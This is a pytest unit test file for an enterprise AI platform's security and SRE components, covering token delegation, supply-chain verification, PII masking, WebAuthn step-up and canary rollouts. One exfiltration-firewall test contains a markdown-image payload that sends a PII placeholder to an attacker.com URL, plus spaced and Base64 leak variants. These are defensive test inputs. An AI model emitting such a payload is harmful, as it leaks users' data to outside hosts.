"""Unit test suite covering all 12 V2 Principal-tier advanced features & SRE primitives."""

from __future__ import annotations

import asyncio
import base64
from decimal import Decimal
from pathlib import Path

import pytest
from enterprise_twin.corpus_seed.historical_tickets import generate_500_historical_tickets
from enterprise_twin.idp_seed.meridian_idp import (
    MeridianAgentRegistry,
    MeridianIdentityProvider,
)
from temporalio.api.common.v1 import Payload

from admin_control_plane.canary_and_governance import (
    CanaryRolloutController,
    DualControlGovernanceRegistry,
    explain_zero_plaintext_policy_access,
    export_signed_worm_audit_bundle,
    sync_scim2_group_payload,
)
from aegis_core.aimd import AIMDConcurrencyLimiter, BackpressureShedError
from aegis_core.audit import InMemoryAuditLedger
from aegis_core.crypto import (
    SigningKeyPair,
    TokenVerificationError,
    compute_jwk_thumbprint_from_public_jwk,
)
from aegis_core.models import (
    AuthorizationDetail,
    ClearanceLevel,
    DocumentClassification,
    ScoredChunk,
    TokenExchangeRequest,
)
from aegis_core.sli_metrics import SLIRegistry
from airgap_verifier.audit_airgap import verify_airgap_bundle_readiness
from airgap_verifier.supply_chain import (
    SBOMVulnerability,
    sign_supply_chain_bundle,
    verify_supply_chain_admission,
)
from arch_scoper.scoper import ArchitectureScoperEngine, ScopeDiscoveryIntake
from edge_triage_router.cascade_scheduler import (
    ConformalCascadeDecider,
    ConsistentHashGPURouter,
    MultiLoRARegistry,
    compute_normalized_logprob_entropy,
)
from finops_telemetry.budget_governor import (
    AtomicBudgetGovernor,
    WelfordCostAnomalyDetector,
    compute_onprem_gpu_amortized_cost_usd,
)
from legacy_ingestor.cobol_advanced import (
    decode_variable_wire_batch_vb_stream,
    encode_variable_wire_batch_record,
    pack_zos_recfm_vb_block,
    parse_iso20022_pacs008_wire,
)
from legacy_ingestor.merkle_sync import MerkleSyncTracker, compute_merkle_root
from mcp_erp_bridge.wsdl_compiler import (
    DurableIdempotencyOutbox,
    MultiERPSagaCoordinator,
    compile_wsdl_to_mcp_tools,
)
from pii_unmasking_proxy.fpe_and_automaton import (
    AhoCorasickEntityMatcher,
    FeistelNumericFPE,
    PIIExfiltrationBlockedError,
    assert_no_surrogate_exfiltration,
)
from pii_unmasking_proxy.sse_stream import passes_luhn_checksum
from secure_rag_engine.reranker_grounding import (
    LocalCrossEncoderReranker,
    verify_answer_citations,
)
from shadow_replay_harness.harness import PolicyGuidedShadowAgent, ShadowReplayHarness
from sso_delegation_broker.broker import DelegationPolicyError, SSODelegationBroker
from sso_delegation_broker.dpop_ssf import (
    mint_dpop_proof,
    mint_ssf_security_event_token,
    verify_mtls_cert_thumbprint,
)
from sso_delegation_broker.revocation import InMemoryRevocationStore
from temporal_approval_gate.quorum_webauthn import (
    AESGCMPayloadCodec,
    build_teams_adaptive_card,
    mint_webauthn_stepup_assertion,
    verify_webauthn_stepup_assertion,
)


@pytest.mark.unit
def test_sli_registry_prometheus_and_multi_burn_slo() -> None:
    now = [1000.0]
    reg = SLIRegistry(target_availability=0.9995, clock=lambda: now[0])
    assert reg.evaluate_slo("svc-a").total_requests == 0

    for _ in range(95):
        reg.record_sli_request(
            service_name="svc-a", method="POST", route="/v1/test", status_code=200, duration_seconds=0.004
        )
    snap_ok = reg.evaluate_slo("svc-a")
    assert snap_ok.page_alert_fast_burn_14_4x is False

    # Inject 5% unhandled 500 error spike (100x the 0.05% error budget -> triggers 14.4x fast burn!)
    for _ in range(5):
        reg.record_sli_request(
            service_name="svc-a", method="POST", route="/v1/test", status_code=500, duration_seconds=0.050
        )
    snap_burn = reg.evaluate_slo("svc-a")
    assert snap_burn.page_alert_fast_burn_14_4x is True
    assert snap_burn.ticket_alert_slow_burn_6x is True

    hist = reg.histogram_snapshot("aegis_http_request_duration_seconds")
    assert hist.count == 100
    assert hist.p95_seconds >= 0.004

    prom = reg.render_prometheus_text()
    assert "# TYPE aegis_http_requests_total counter" in prom
    assert "# TYPE aegis_http_request_duration_seconds histogram" in prom


@pytest.mark.unit
def test_aimd_concurrency_limiter_gradient_and_shedding() -> None:
    clock = [10.0]
    aimd = AIMDConcurrencyLimiter(
        "sap-pool", initial_limit=4, min_limit=2, max_limit=8, clock=lambda: clock[0]
    )
    # Baseline fast RTT (1ms)
    with aimd.acquire():
        clock[0] += 0.001
    assert aimd.current_limit == 4

    # Simulate severe upstream queueing (RTT spikes to 50ms -> gradient < 0.85 -> multiplicative backoff)
    with aimd.acquire():
        clock[0] += 0.050
    assert aimd.current_limit < 4

    # Verify fail-fast shedding when permits exhausted
    lim_2 = AIMDConcurrencyLimiter("tight", initial_limit=1, min_limit=1, max_limit=2)
    with lim_2.acquire(), pytest.raises(BackpressureShedError), lim_2.acquire():
        pass
    assert lim_2.snapshot().shed_total == 1


@pytest.mark.unit
def test_p1_dpop_mtls_subdelegation_rar_ssf_and_keyring() -> None:
    idp = MeridianIdentityProvider()
    agents = MeridianAgentRegistry()
    rev = InMemoryRevocationStore()
    audit = InMemoryAuditLedger()
    idp_ssf_key = SigningKeyPair.generate_es256()

    broker = SSODelegationBroker(
        idp=idp,
        agent_registry=agents,
        revocation_store=rev,
        audit_ledger=audit,
        trusted_ssf_jwks={"keys": [idp_ssf_key.public_jwk]},
        ssf_issuer="https://idp.meridian.fin",
    )

    holder_key = SigningKeyPair.generate_es256()
    jkt = compute_jwk_thumbprint_from_public_jwk(holder_key.public_jwk)
    dpop_proof = mint_dpop_proof(
        holder_key=holder_key,
        htm="POST",
        htu="https://auth.aegis.meridian.fin/v1/oauth/token",
    )

    # Mint human -> orchestrator token with DPoP + mTLS + RFC 9396 RAR (requesting $90k, capped at Priya's $50k limit)
    human_jwt = idp.issue_oidc_token_for_persona("priya.nair")
    ex = broker.exchange_token(
        TokenExchangeRequest(
            subject_token=human_jwt,
            subject_token_type="urn:ietf:params:oauth:token-type:access_token",
            agent_id="meridian-procurement-agent",
            requested_scopes=["rag:read", "erp:po:create"],
            dpop_jkt=jkt,
            mtls_cert_thumbprint_s256="cert-sha256-xyz",
            authorization_details=[
                AuthorizationDetail(type="sap_po", actions=("create",), max_amount_usd=90_000.0)
            ],
        ),
        dpop_proof_jwt=dpop_proof,
    )
    assert ex.token_type == "DPoP"
    # RAR max_amount_usd narrowed monotonically to Priya's $50,000 limit!
    assert ex.authorization_details[0].max_amount_usd == 50_000.0

    # Replay of identical DPoP jti is rejected
    with pytest.raises(DelegationPolicyError):
        broker.exchange_token(
            TokenExchangeRequest(
                subject_token=human_jwt,
                subject_token_type="urn:ietf:params:oauth:token-type:access_token",
                agent_id="meridian-procurement-agent",
                requested_scopes=["rag:read"],
                dpop_jkt=jkt,
            ),
            dpop_proof_jwt=dpop_proof,
        )

    # Verify DPoP + mTLS enforcement on resource consumption
    resource_proof = mint_dpop_proof(
        holder_key=holder_key,
        htm="POST",
        htu="https://rag.meridian.fin/v1/retrieve",
        access_token=ex.access_token,
    )
    verified = broker.verify_and_check_revocation(
        ex.access_token,
        required_scope="rag:read",
        dpop_proof_jwt=resource_proof,
        expected_htm="POST",
        expected_htu="https://rag.meridian.fin/v1/retrieve",
        presented_mtls_x5t_s256="cert-sha256-xyz",
    )
    assert verified.cnf_jkt == jkt
    with pytest.raises(TokenVerificationError):
        verify_mtls_cert_thumbprint("cert-sha256-xyz", "wrong-cert")

    # Zero-downtime signing key rotation preserves existing token validity!
    old_token = ex.access_token
    new_kid = broker.rotate_signing_key()
    assert new_kid != ""
    assert broker.verify_and_check_revocation(
        old_token, presented_mtls_x5t_s256="cert-sha256-xyz"
    ).jti == ex.jti

    # Multi-hop subdelegation (`meridian-procurement-agent` -> `meridian-research-assistant`)
    parent_plain = broker.exchange_token(
        TokenExchangeRequest(
            subject_token=human_jwt,
            subject_token_type="urn:ietf:params:oauth:token-type:access_token",
            agent_id="meridian-procurement-agent",
            requested_scopes=["rag:read", "erp:po:create"],
        )
    )
    sub_ex = broker.exchange_agent_to_agent(
        parent_agent_token=parent_plain.access_token,
        target_subagent_id="meridian-research-assistant",
        requested_scopes=["rag:read", "erp:po:create"],
        requested_ttl_seconds=60,
    )
    assert sub_ex.delegation_depth == 2
    assert sub_ex.scope == "rag:read"  # narrowed to subagent capability!

    # Cycle detection: subdelegating back to `meridian-procurement-agent` is blocked!
    with pytest.raises(DelegationPolicyError):
        broker.exchange_agent_to_agent(
            parent_agent_token=sub_ex.access_token,
            target_subagent_id="meridian-procurement-agent",
            requested_scopes=["rag:read"],
        )

    # OpenID SSF / CAEP instant push revocation revokes BOTH parent and nested subagent tokens!
    ssf_jwt = mint_ssf_security_event_token(
        idp_signing_key=idp_ssf_key,
        issuer="https://idp.meridian.fin",
        audience=broker.issuer,
        tenant_id="meridian-fin",
        subject_id=verified.sub,
    )
    ssf_res = broker.ingest_ssf_security_event(ssf_jwt)
    assert ssf_res["revoked_tokens"] >= 2
    with pytest.raises(TokenVerificationError):
        broker.verify_and_check_revocation(sub_ex.access_token)


@pytest.mark.unit
def test_p2_cosign_sbom_slsa_and_airgap_verifier() -> None:
    repo_root = Path(__file__).resolve().parents[2]
    report = verify_airgap_bundle_readiness(repo_root)
    assert report.all_passed is True
    assert len(report.findings) >= 7

    cosign_key = SigningKeyPair.generate_es256()
    digest = "sha256:" + "a" * 64
    clean_bundle = sign_supply_chain_bundle(
        private_key_pem=cosign_key.private_pem,
        image_ref="registry.internal/aegis/sso-broker",
        image_digest=digest,
        components=[{"name": "fastapi", "version": "0.115.0"}],
        source_commit_sha="7075fab",
    )
    ok, msg = verify_supply_chain_admission(
        clean_bundle,
        trusted_public_key_pem=cosign_key.public_pem,
        expected_image_digest=digest,
    )
    assert ok is True, msg

    vuln_bundle = sign_supply_chain_bundle(
        private_key_pem=cosign_key.private_pem,
        image_ref="registry.internal/aegis/sso-broker",
        image_digest=digest,
        components=[{"name": "openssl", "version": "3.0.0"}],
        source_commit_sha="7075fab",
        vulnerabilities=[
            SBOMVulnerability(cve_id="CVE-2026-9999", package_name="openssl", severity="CRITICAL")
        ],
    )
    ok_v, msg_v = verify_supply_chain_admission(
        vuln_bundle,
        trusted_public_key_pem=cosign_key.public_pem,
        expected_image_digest=digest,
    )
    assert ok_v is False and "CVE-2026-9999" in msg_v


@pytest.mark.unit
def test_p3_recfm_vb_odo_redefines_iso20022_and_merkle_sync() -> None:
    r1 = encode_variable_wire_batch_record(
        customer_id="CUST001",
        instrument_kind="WIRE",
        routing_or_pan_detail="02100002199887766",
        allocations=[("CHRONOS", Decimal("125000.50")), ("HELIOS", Decimal("-450.25"))],
        codepage="cp1140",
    )
    r2 = encode_variable_wire_batch_record(
        customer_id="CUST002",
        instrument_kind="CARD",
        routing_or_pan_detail="TOK_49928811",
        allocations=[],
        codepage="cp1140",
    )
    vb_stream = pack_zos_recfm_vb_block([r1, r2])
    decoded = decode_variable_wire_batch_vb_stream(vb_stream, codepage="cp1140")
    assert len(decoded) == 2
    assert decoded[0]["redefines_detail"]["aba_routing"] == "021000021"
    assert decoded[0]["allocations"][0]["amount_usd"] == Decimal("125000.50")
    assert decoded[1]["allocation_count"] == 0

    iso_xml = (
        b'<?xml version="1.0"?><Document xmlns="urn:iso:std:iso:20022:tech:xsd:pacs.008.001.08">'
        b"<FIToFICstmrCdtTrf><CdtTrfTxInf>"
        b"<PmtId><EndToEndId>E2E-MERIDIAN-901</EndToEndId></PmtId>"
        b'<IntrBkSttlmAmt Ccy="USD">4250000.00</IntrBkSttlmAmt>'
        b"<Dbtr><Nm>Meridian Treasury</Nm></Dbtr>"
        b"<Cdtr><Nm>Helios Escrow</Nm></Cdtr>"
        b"<RmtInf><Ustrd>Chronos Tranche A</Ustrd></RmtInf>"
        b"</CdtTrfTxInf></FIToFICstmrCdtTrf></Document>"
    )
    wires = parse_iso20022_pacs008_wire(iso_xml)
    assert wires[0]["end_to_end_id"] == "E2E-MERIDIAN-901"
    assert wires[0]["amount"] == "4250000.00"

    # Merkle incremental sync: editing 1 page out of 20 skips 19 unchanged leaves!
    tracker = MerkleSyncTracker()
    pages_v1 = [(f"chk-{i}", f"Page {i} baseline text") for i in range(20)]
    d1 = tracker.compute_and_commit_delta(
        tenant_id="t1", document_id="doc-20", chunk_ids_and_contents=pages_v1
    )
    assert len(d1.changed_indices) == 20 and d1.unchanged_count == 0

    d_same = tracker.compute_and_commit_delta(
        tenant_id="t1", document_id="doc-20", chunk_ids_and_contents=pages_v1
    )
    assert len(d_same.changed_indices) == 0 and d_same.unchanged_count == 20

    pages_v2 = list(pages_v1)
    pages_v2[7] = ("chk-7", "Page 7 amended breakup fee USD 210M")
    d2 = tracker.compute_and_commit_delta(
        tenant_id="t1", document_id="doc-20", chunk_ids_and_contents=pages_v2
    )
    assert d2.changed_indices == (7,)
    assert d2.unchanged_count == 19
    assert compute_merkle_root([]) != ""


@pytest.mark.unit
def test_p4_cross_encoder_reranker_and_citation_grounding() -> None:
    chunks = [
        ScoredChunk(
            chunk_id="chk-1",
            document_id="d1",
            title="General Travel Policy",
            source_uri="s1",
            source_system="policy_kb",
            page_or_record_ref="p1",
            classification=DocumentClassification.INTERNAL,
            content="Meals reimbursed up to USD 75 per day.",
            dense_score=0.6,
            lexical_score=0.2,
            rrf_score=0.032,
        ),
        ScoredChunk(
            chunk_id="chk-2",
            document_id="d2",
            title="Project Chronos Breakup Fee",
            source_uri="s2",
            source_system="sharepoint_ma",
            page_or_record_ref="p4",
            classification=DocumentClassification.TOP_SECRET_MA,
            content="The reverse breakup fee for Project Chronos is USD 185 million.",
            dense_score=0.55,
            lexical_score=0.4,
            rrf_score=0.031,
        ),
    ]
    reranked = LocalCrossEncoderReranker().rerank(
        "Project Chronos reverse breakup fee", chunks, top_k=2
    )
    assert reranked[0].chunk_id == "chk-2"
    assert reranked[0].rerank_score is not None

    grounded_ok = verify_answer_citations(
        answer_text="Project Chronos has a reverse breakup fee of USD 185 million [chk-2].",
        authorized_chunks=reranked,
    )
    assert grounded_ok.grounded is True

    hallucinated = verify_answer_citations(
        answer_text="Secret valuation is USD 9B [chk-999-unauthorized].",
        authorized_chunks=reranked,
    )
    assert hallucinated.grounded is False
    assert "chk-999-unauthorized" in hallucinated.unauthorized_or_missing_citations


@pytest.mark.unit
def test_p5_wsdl_compiler_durable_outbox_and_saga(tmp_path: Path) -> None:
    wsdl = (
        b'<definitions xmlns="http://schemas.xmlsoap.org/wsdl/" xmlns:xsd="http://www.w3.org/2001/XMLSchema">'
        b"<types><xsd:schema>"
        b'<xsd:element name="Z_WIRE_RELEASE"><xsd:complexType><xsd:sequence>'
        b'<xsd:element name="WIRE_ID" type="xsd:string" minOccurs="1"/>'
        b'<xsd:element name="AMOUNT" type="xsd:decimal" minOccurs="1"/>'
        b"</xsd:sequence></xsd:complexType></xsd:element>"
        b"</xsd:schema></types>"
        b'<portType name="PT"><operation name="Z_WIRE_RELEASE">'
        b"<documentation>Release wire</documentation></operation></portType>"
        b"</definitions>"
    )
    tools = compile_wsdl_to_mcp_tools(wsdl)
    assert tools[0]["name"] == "sap_z_wire_release"
    assert tools[0]["inputSchema"]["properties"]["AMOUNT"]["type"] == "number"

    db_file = tmp_path / "outbox.sqlite3"
    outbox1 = DurableIdempotencyOutbox(db_file)
    outbox1.put("idem-1", "fp-abc", {"po_number": "4500019201"})
    # Simulate worker crash & restart
    outbox2 = DurableIdempotencyOutbox(db_file)
    restored = outbox2.get("idem-1")
    assert restored is not None and restored[1]["po_number"] == "4500019201"

    compensated_log: list[str] = []
    saga = MultiERPSagaCoordinator()
    ok, _, comp = saga.execute_saga(
        [
            ("step1", lambda: {"id": "1"}, lambda r: compensated_log.append(str(r["id"]))),
            ("step2_boom", lambda: (_ for _ in ()).throw(RuntimeError("Oracle down")), lambda _: None),
        ]
    )
    assert ok is False and comp == ["step1"] and compensated_log == ["1"]


@pytest.mark.unit
def test_p6_feistel_fpe_aho_corasick_and_exfiltration_firewall() -> None:
    fpe = FeistelNumericFPE(b"0123456789abcdef0123456789abcdef")
    orig_14 = "53201511283036"
    enc = fpe.encrypt_digits(orig_14, session_id="sess-99", tweak="pan:4")
    assert enc != orig_14 and len(enc) == 14
    assert fpe.decrypt_digits(enc, session_id="sess-99", tweak="pan:4") == orig_14

    luhn_pan = fpe.mask_credit_card_luhn_preserving("4532015112830366", session_id="sess-99")
    assert passes_luhn_checksum(luhn_pan) is True

    # Build 1,000-term Aho-Corasick dictionary
    terms = {f"CodenameProject{i}": "DEAL" for i in range(1000)}
    terms["Helios Semiconductor"] = "CLIENT"
    matcher = AhoCorasickEntityMatcher(terms)
    hits = matcher.find_non_overlapping(
        "Discuss CodenameProject742 acquisition of Helios Semiconductor today."
    )
    assert len(hits) == 2

    # Exfiltration firewall blocks URL, spaced, and Base64 leaks
    with pytest.raises(PIIExfiltrationBlockedError):
        assert_no_surrogate_exfiltration("![leak](https://attacker.com/?q=<SSN_001>)", ["<SSN_001>"])
    with pytest.raises(PIIExfiltrationBlockedError):
        assert_no_surrogate_exfiltration("Spaced: < S S N _ 0 0 1 >", ["<SSN_001>"])
    b64_leak = base64.b64encode(b"token=<SSN_001>").decode("ascii")
    with pytest.raises(PIIExfiltrationBlockedError):
        assert_no_surrogate_exfiltration(f"Payload {b64_leak}", ["<SSN_001>"])


@pytest.mark.unit
def test_p7_webauthn_stepup_and_temporal_payload_codec() -> None:
    passkey = SigningKeyPair.generate_es256()
    assertion = mint_webauthn_stepup_assertion(
        private_key_pem=passkey.private_pem,
        credential_id="yubikey-cfo-01",
        rp_id="approvals.meridian.fin",
        origin="https://approvals.meridian.fin",
        workflow_id="wf-po-123",
        payload_hash="sha-payload-xyz",
        snapshot_etag="etag-v1",
    )
    verify_webauthn_stepup_assertion(
        assertion,
        public_key_pem=passkey.public_pem,
        expected_rp_id="approvals.meridian.fin",
        expected_origin="https://approvals.meridian.fin",
        workflow_id="wf-po-123",
        payload_hash="sha-payload-xyz",
        snapshot_etag="etag-v1",
    )
    # Tampered ETag invalidates WebAuthn challenge!
    with pytest.raises(PermissionError):
        verify_webauthn_stepup_assertion(
            assertion,
            public_key_pem=passkey.public_pem,
            expected_rp_id="approvals.meridian.fin",
            expected_origin="https://approvals.meridian.fin",
            workflow_id="wf-po-123",
            payload_hash="sha-payload-xyz",
            snapshot_etag="etag-MUTATED",
        )

    # Zero-knowledge Temporal AESGCMPayloadCodec async roundtrip
    codec = AESGCMPayloadCodec(b"k" * 32)
    raw_payload = Payload(metadata={"encoding": b"json/plain"}, data=b'{"iban":"US64SVBK"}')
    encrypted = asyncio.run(codec.encode([raw_payload]))
    assert b"US64SVBK" not in encrypted[0].data
    decrypted = asyncio.run(codec.decode(encrypted))
    assert decrypted[0].data == b'{"iban":"US64SVBK"}'
    assert build_teams_adaptive_card(
        workflow_id="wf-1", requester_sub="alice", vendor_id="100", amount_usd=60000, required_quorum=1
    )["type"] == "AdaptiveCard"


@pytest.mark.unit
def test_p8_p9_p10_p11_p12_advanced_engines() -> None:
    # P8: Conformal entropy + Consistent hash ring
    low_ent = compute_normalized_logprob_entropy([-0.01, -9.0, -10.0])
    high_ent = compute_normalized_logprob_entropy([-1.1, -1.1, -1.1])
    assert low_ent < 0.1 and high_ent > 0.95

    decider = ConformalCascadeDecider(conformal_tau=0.35)
    assert decider.evaluate(
        prompt="What are office hours?", classifier_confidence=0.98, top_logprobs=[-0.01, -8.0]
    ).serve_locally_on_8b is True

    ring = ConsistentHashGPURouter(["gpu-0", "gpu-1", "gpu-2"])
    r_first = ring.select_replica("tenant-a:session-42")
    ring.release_replica(r_first)
    assert ring.select_replica("tenant-a:session-42") == r_first
    ring.release_replica(r_first)
    assert MultiLoRARegistry().resolve_adapter("M&A Advisory") == "lora-mnpi-ma-v2"

    # P9: Atomic budget governor + Welford anomaly + GPU energy
    gov = AtomicBudgetGovernor()
    gov.set_monthly_budget("t1", "CC-1", 100.0)
    assert gov.evaluate_and_reserve(
        tenant_id="t1", cost_center="CC-1", requested_model_id="gpt-5-enterprise", estimated_cost_usd=75.0
    ).decision == "ALLOW_REQUESTED_MODEL"
    step_res = gov.evaluate_and_reserve(
        tenant_id="t1", cost_center="CC-1", requested_model_id="gpt-5-enterprise", estimated_cost_usd=10.0
    )
    assert step_res.decision == "STEP_DOWN_LOCAL_MODEL"
    assert step_res.effective_model_id == "qwen2.5-8b-awq-local"
    assert gov.evaluate_and_reserve(
        tenant_id="t1", cost_center="CC-1", requested_model_id="gpt-5-enterprise", estimated_cost_usd=30.0
    ).decision == "HARD_STOP_BUDGET_EXCEEDED"
    assert compute_onprem_gpu_amortized_cost_usd(gpu_compute_ms=3600_000.0) > 1.85

    det = WelfordCostAnomalyDetector(min_samples=10)
    for i in range(12):
        det.observe("t1:po", 1000 + (i % 5) * 10)
    spike = det.observe("t1:po", 95_000)
    assert spike.is_anomalous is True and spike.z_score > 10.0

    # P10: Bootstrap CI99 + Adversarial Red-Team + Dark-Traffic Mirror
    harness = ShadowReplayHarness()
    tickets = generate_500_historical_tickets()
    agent = PolicyGuidedShadowAgent()
    good_prompt = "Enforce MNPI clearance strictly, refuse SPERR=X, escalate > USD 50,000."
    rep = harness.run_suite(
        prompt_version_id="v-good", system_prompt=good_prompt, tickets=tickets, agent=agent
    )
    assert rep.release_gate_passed is True
    assert rep.accuracy_ci99_lower >= 0.98
    assert rep.slice_accuracies["unauthorized_mnpi_refusal"] == 1.0

    adv = harness.run_adversarial_redteam_suite(system_prompt=good_prompt, agent=agent)
    assert adv.passed is True and adv.defense_rate == 1.0

    harness.dark_traffic_mirror.tap_request(prod_tool="a", candidate_tool="a")
    harness.dark_traffic_mirror.tap_request(prod_tool="a", candidate_tool="b", category="po_drift")
    assert harness.dark_traffic_mirror.snapshot().agreement_rate == 0.5

    # P11: Multi-objective H100 selection under aggressive 130ms TTFT + OSCAL + EU AI Act
    sow = ArchitectureScoperEngine().generate_sow(
        ScopeDiscoveryIntake(
            client_name="Apex Sovereign Bank",
            executive_objective="Deploy low-latency air-gapped M&A and SAP copilot",
            compliance_regimes=["FEDRAMP_HIGH", "SEC_FINRA_MNPI"],
            air_gapped_vpc_required=True,
            legacy_sources=["SAP_SOAP", "COBOL_MAINFRAME"],
            peak_concurrent_users=160,
            corpus_document_count=50_000,
            autonomous_write_max_usd=25_000.0,
            target_ttft_p99_ms=130.0,
        )
    )
    assert "H100" in sow.bom.inference_gpu_type
    assert sow.oscal_ssp_json["system-security-plan"]["oscal-version"] == "1.1.2"
    assert "article_14_human_oversight" in sow.eu_ai_act_dossier
    assert "airGapped: true" in sow.gitops_helm_values_yaml
    assert float(sow.monte_carlo_schedule_risk["p90_business_days"]) >= float(
        sow.monte_carlo_schedule_risk["p50_business_days"]
    )

    # P12: Canary auto-rollback + Two-Person Rule + SCIM 2.0 + Zero-Plaintext Explain + WORM
    canary = CanaryRolloutController(baseline_version_id="prompt-v1", min_samples_before_eval=10)
    canary.configure_canary(canary_version_id="prompt-v2", weight_pct=50)
    rolled = False
    for _ in range(10):
        r, _ = canary.record_canary_outcome(is_error=True, latency_ms=250.0)
        rolled = rolled or r
    assert rolled is True and canary.status().canary_weight_pct == 0

    dc = DualControlGovernanceRegistry()
    prop = dc.propose(
        action_type="ROTATE_PROD_KMS_SECRET",
        target_resource="sap-prod",
        secret_or_payload="s3cr3t-value-99",
        proposer_sub="admin.one",
    )
    with pytest.raises(PermissionError):
        dc.approve_and_release(proposal_id=prop.proposal_id, co_signer_sub="admin.one")
    approved_prop, released = dc.approve_and_release(
        proposal_id=prop.proposal_id, co_signer_sub="admin.two"
    )
    assert approved_prop.status == "APPROVED_EXECUTED" and released == "s3cr3t-value-99"

    edges, tuples = sync_scim2_group_payload(
        tenant_id="meridian-fin",
        scim_group={
            "schemas": ["urn:ietf:params:scim:schemas:core:2.0:Group"],
            "displayName": "ma_clean_team",
            "members": [{"value": "pod_alpha", "type": "Group"}],
        },
        granted_document_ids=["doc-chronos"],
    )
    explain = explain_zero_plaintext_policy_access(
        tenant_id="meridian-fin",
        subject_id="analyst.1",
        direct_groups=["pod_alpha"],
        subject_clearance=ClearanceLevel.TOP_SECRET_MA,
        document_id="doc-chronos",
        document_tenant_id="meridian-fin",
        document_clearance_required=ClearanceLevel.TOP_SECRET_MA,
        rebac_tuples=tuples,
        hierarchy_edges=edges,
    )
    assert explain.decision == "ALLOW"
    assert "ma_clean_team" in explain.effective_groups

    ledger = InMemoryAuditLedger()
    worm = export_signed_worm_audit_bundle(
        signing_key=SigningKeyPair.generate_es256(),
        tenant_id="meridian-fin",
        records=ledger.list_records(),
    )
    assert worm["worm_mode"] == "COMPLIANCE"


@pytest.mark.unit
def test_v2_defensive_error_branches_and_boundary_guards() -> None:
    """Exercise defensive security rejection branches across DPoP, SSF, Supply Chain, & Canary."""
    from sso_delegation_broker.dpop_ssf import DPoPProofVerifier, SSFSecurityEventReceiver

    dv = DPoPProofVerifier()
    with pytest.raises(TokenVerificationError):
        dv.verify_proof("not-a-jwt", expected_htm="POST", expected_htu="https://a/b", expected_jkt="x")

    holder = SigningKeyPair.generate_es256()
    jkt = compute_jwk_thumbprint_from_public_jwk(holder.public_jwk)
    p1 = mint_dpop_proof(holder_key=holder, htm="POST", htu="https://a/b", access_token="tok-1")
    with pytest.raises(TokenVerificationError):
        dv.verify_proof(p1, expected_htm="POST", expected_htu="https://a/b", expected_jkt="wrong-jkt")
    with pytest.raises(TokenVerificationError):
        dv.verify_proof(p1, expected_htm="GET", expected_htu="https://a/b", expected_jkt=jkt)
    with pytest.raises(TokenVerificationError):
        dv.verify_proof(
            p1, expected_htm="POST", expected_htu="https://a/b", expected_jkt=jkt, access_token="wrong-tok"
        )
    with pytest.raises(TokenVerificationError):
        dv.verify_proof(
            p1, expected_htm="POST", expected_htu="https://a/b", expected_jkt=jkt, now_epoch=1
        )

    rs_key = SigningKeyPair.generate_rs256()
    assert compute_jwk_thumbprint_from_public_jwk(rs_key.public_jwk) != ""
    ssf_rec = SSFSecurityEventReceiver(
        trusted_idp_jwks={"keys": [rs_key.public_jwk]},
        expected_issuer="https://idp.example",
        expected_audience="https://aud.example",
        revocation_store=InMemoryRevocationStore(),
        audit_ledger=InMemoryAuditLedger(),
    )
    with pytest.raises(TokenVerificationError):
        ssf_rec.ingest_set_token("bad.jwt.token")
    ssf_tok = mint_ssf_security_event_token(
        idp_signing_key=rs_key,
        issuer="https://idp.example",
        audience="https://aud.example",
        tenant_id="t1",
        subject_id="alice",
    )
    assert ssf_rec.ingest_set_token(ssf_tok)["status"] == "processed"
    assert ssf_rec.ingest_set_token(ssf_tok)["status"] == "idempotent_duplicate"

    # Canary stage validation, baseline routing, & 100% cutover
    can = CanaryRolloutController(baseline_version_id="v1")
    with pytest.raises(ValueError):
        can.configure_canary(canary_version_id="v2", weight_pct=33)
    can.configure_canary(canary_version_id="v2", weight_pct=50)
    routed_set = {can.route_version("t1", f"user-{i}") for i in range(40)}
    assert routed_set == {"v1", "v2"}
    can.configure_canary(canary_version_id="v2", weight_pct=100)
    assert can.route_version("t1", "user-1") == "v2"

    # Supply chain tampered digest & wrong public key rejection
    k1 = SigningKeyPair.generate_es256()
    k2 = SigningKeyPair.generate_es256()
    d = "sha256:" + "b" * 64
    b_sig = sign_supply_chain_bundle(
        private_key_pem=k1.private_pem,
        image_ref="img",
        image_digest=d,
        components=[],
        source_commit_sha="abcdef1",
    )
    assert verify_supply_chain_admission(
        b_sig, trusted_public_key_pem=k2.public_pem, expected_image_digest=d
    )[0] is False
    assert verify_supply_chain_admission(
        b_sig, trusted_public_key_pem=k1.public_pem, expected_image_digest="sha256:" + "c" * 64
    )[0] is False

    # RAR parent-to-child narrowing (actions, cost_centers, sources) + WebAuthn UV=0 / origin / rp_id checks
    from sso_delegation_broker.broker import _attenuate_rar_details

    parent_rar = (
        AuthorizationDetail(
            type="sap_po",
            actions=("create", "simulate"),
            max_amount_usd=20_000.0,
            allowed_cost_centers=("CC-100", "CC-200"),
        ),
        AuthorizationDetail(
            type="rag_corpus",
            allowed_sources=("policy_kb", "sharepoint_ma"),
        ),
    )
    narrowed_rar = _attenuate_rar_details(
        [
            AuthorizationDetail(
                type="sap_po",
                actions=("create", "delete"),
                max_amount_usd=50_000.0,
                allowed_cost_centers=("CC-200", "CC-999"),
            ),
            AuthorizationDetail(
                type="rag_corpus",
                allowed_sources=("policy_kb", "cobol_core_banking"),
            ),
            AuthorizationDetail(type="admin_mutation", actions=("rotate",)),
        ],
        po_ceiling_usd=30_000.0,
        parent_details=parent_rar,
    )
    assert len(narrowed_rar) == 2
    assert narrowed_rar[0].actions == ("create",)
    assert narrowed_rar[0].max_amount_usd == 20_000.0
    assert narrowed_rar[0].allowed_cost_centers == ("CC-200",)
    assert narrowed_rar[1].allowed_sources == ("policy_kb",)

    pk = SigningKeyPair.generate_es256()
    uv0_assertion = mint_webauthn_stepup_assertion(
        private_key_pem=pk.private_pem,
        credential_id="cred-1",
        rp_id="approvals.meridian.fin",
        origin="https://approvals.meridian.fin",
        workflow_id="wf-1",
        payload_hash="h1",
        snapshot_etag="e1",
        user_verified=False,
    )
    with pytest.raises(PermissionError):
        verify_webauthn_stepup_assertion(
            uv0_assertion,
            public_key_pem=pk.public_pem,
            expected_rp_id="approvals.meridian.fin",
            expected_origin="https://approvals.meridian.fin",
            workflow_id="wf-1",
            payload_hash="h1",
            snapshot_etag="e1",
        )
    valid_a = mint_webauthn_stepup_assertion(
        private_key_pem=pk.private_pem,
        credential_id="cred-1",
        rp_id="approvals.meridian.fin",
        origin="https://approvals.meridian.fin",
        workflow_id="wf-1",
        payload_hash="h1",
        snapshot_etag="e1",
        user_verified=True,
    )
    with pytest.raises(PermissionError):
        verify_webauthn_stepup_assertion(
            valid_a,
            public_key_pem=pk.public_pem,
            expected_rp_id="wrong.rp.fin",
            expected_origin="https://approvals.meridian.fin",
            workflow_id="wf-1",
            payload_hash="h1",
